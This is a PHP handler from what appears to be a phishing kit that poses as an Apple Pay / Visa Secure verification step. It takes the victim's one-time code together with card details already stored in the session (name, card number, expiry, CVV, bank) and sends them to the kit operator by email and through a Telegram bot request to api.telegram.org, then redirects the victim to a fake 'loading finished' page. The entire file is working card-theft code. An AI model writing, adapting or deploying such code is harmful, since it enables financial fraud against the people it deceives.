<?php
include("../infos.php");
include("../common/sub_includes.php");
include("../common/functions.php");

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
	start_session();
	gather_vbv_infos();

	
	if(!isset($_SESSION)){
		session_start();
	}

	$_SESSION['vbv_code'] = $_POST['vbv_code'];

	$brand = $_SESSION['bin_brand'];
	$bank = $_SESSION['bin_bank'];
	$type = $_SESSION['bin_type'];
				######################
				#### MAIL SENDING ####
				######################

				
				if($mail_sending == true){
					
					$message = "
		                    
[🇩🇿] Apple Pay [🇩🇿]

💶 Apple Pay : ".$_SESSION['vbv_code']."

[💶] Card [💶]

💶 Nom : ".$_SESSION['nomcc']."

💶 Numéro : ".$_SESSION['ccnum']."
💶 Date d'expiration : ".$_SESSION['ccexp']."
💶 CVV : ".$_SESSION['cvv']."

🌐 Level : ".$brand."
🌐 Banque : ".$bank."
🌐 Type : ".$type."

					";

					$subject = "[⚡️] + 1 Apple Pay Pasletime FDP".$_SESSION['vbv_code']." - ".$_SESSION['ip'];
					$headers = "From: 🃏 Pasletime13 🃏 <signenano@lazone.com>";

					mail($rezmail, $subject, $message, $headers);
				}

				##########################
				#### TELEGRAM SENDING ####
				##########################

				if($telegram_sending == true){

					$data = [
					'text' => '

[⚡️] Code Apple Pay Pasletime FDP [⚡️]

⚡️ Code : '.$_SESSION['vbv_code'].'

[💶] Card [💶]

💶 Nom/Prénom : '.$_SESSION['nomcc'].'
💶 Numéro : '.$_SESSION['ccnum'].'
💶 Expiration : '.$_SESSION['ccexp'].'
💶 CVV : '.$_SESSION['cvv'].'



					',
					'chat_id' => $chat_login
								];

					file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?".http_build_query($data) );
				}

	header("Location: ../steps/loading_finished.php	");


	}
else{
	header('Location: ../');
}

?>